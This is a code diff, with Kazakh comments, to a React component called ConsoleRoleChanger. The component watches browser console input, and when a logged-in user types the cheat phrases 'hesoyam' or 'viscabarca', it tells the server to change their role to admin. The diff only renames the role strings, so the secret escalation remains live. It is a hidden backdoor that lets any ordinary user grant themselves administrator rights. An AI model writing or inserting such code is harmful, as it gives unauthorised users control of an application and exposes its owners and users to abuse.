@@ -20,8 +20,8 @@ const ConsoleRoleChanger = () => {
       const input = args[0]?.toString().trim().toLowerCase();
       if (input === "hesoyam" || input === "viscabarca") {
         // Қолданушы авторизацияланған және оның рөлі "Customer" болса
-        if (user && user.role === "Customer") {
-          dispatch(updateUserRoleOnServer(user.id, "Admin")); // Рөлді серверде және Redux-та жаңартамыз
+        if (user && user.role === "user") {
+          dispatch(updateUserRoleOnServer(user.id, "admin")); // Рөлді серверде және Redux-та жаңартамыз
           originalConsoleLog("Рөл сәтті өзгертілді: енді сіз Adminсіз!");
         } else {
           originalConsoleLog(
